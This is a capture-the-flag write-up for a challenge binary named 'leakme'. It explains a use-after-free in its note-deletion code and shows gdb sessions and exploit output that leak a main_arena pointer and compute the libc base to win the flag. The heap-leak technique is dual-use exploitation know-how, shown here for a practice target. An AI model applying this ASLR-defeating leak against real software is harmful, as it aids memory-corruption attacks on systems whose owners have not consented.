# leakme writeup

```
$ ./leakme
Heaps of fun 0.1
1. Add note
2. Delete note
3. Print note
4. Get flag
5. Exit
$
```

The program is called `Heaps of fun`, so we should look for interesting heap overflows etc. One menu option that really stands out is the `Get flag` option.

```
$ 4
Give me the libc base address: 0xdeadbeef
You entered: 0xdeadbeef
Nope :( Try again!
```

Okay, so our goal is to find the libc base address! Let's go bug hunting. The function `del_note()` doesn't set the freed notes to `NULL`, which let's us print a note after it has been deleted. This results in a nice UAF bug!

We can use this use-after-free bug to trick the program into leaking a libc address if we first allocate two objects on the heap, and then free the first one. We have to create chunks large enough so that they don't end up in the fast bins, which don't use `fd` and `bk` pointers. 128 bytes is good enough.

Add two notes, both with size 128, delete the first one and then print the first one. We'll use gdb to see what pointer we are leaking from libc. First, set a breakpoint at the call to `printf()` inside `print_note()`. Then check the contents of the `rsi` register.
```
Breakpoint 1, 0x0000000000400d88 in print_note ()
gdb-peda$ x/a $rsi
0x603420:	0x7ffff7dd1b78 <main_arena+88>
```

Great! Subtract the base address of libc from this, and we have the offset we need to find the libc base.

```
gdb-peda$ info proc
process 4753
cmdline = '/home/pewz/tg/leakme'
cwd = '/home/pewz/tg'
exe = '/home/pewz/tg/leakme'
gdb-peda$ cat /proc/4753/maps | grep libc
7ffff7a0e000-7ffff7bcd000 r-xp 00000000 08:01 531009                     /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7bcd000-7ffff7dcd000 ---p 001bf000 08:01 531009                     /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7dcd000-7ffff7dd1000 r--p 001bf000 08:01 531009                     /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7dd1000-7ffff7dd3000 rw-p 001c3000 08:01 531009                     /lib/x86_64-linux-gnu/libc-2.23.so
gdb-peda$ p *(unsigned long *)$rsi - 0x7ffff7a0e000
$8 = 0x3c3b78
```

So, to recap:
1. Add note with size 128
2. Add another note with size 128
3. Delete note 0
4. Print note 0, leaking `main_arena+88`
5. Subtract `0x3c3b78`, and we got the libc base address
6. Call `get_flag()` and send base

Use [this script](src/leak.py) to test the solution.

```
python2 src/leak.py
[+] Opening connection to localhost on port 3190: Done
[*] leaked addr: 0x7fed60355b78
[*] libc base: 0x7fed5ff92000
[*] Sending addr 0x7fed5ff92000
Give me the libc base address: You entered: 0x7fed5ff92000
Yay! Here's the flag: TG17{please_fix_my_leaky_bucket}
[*] Closed connection to localhost port 3190
```
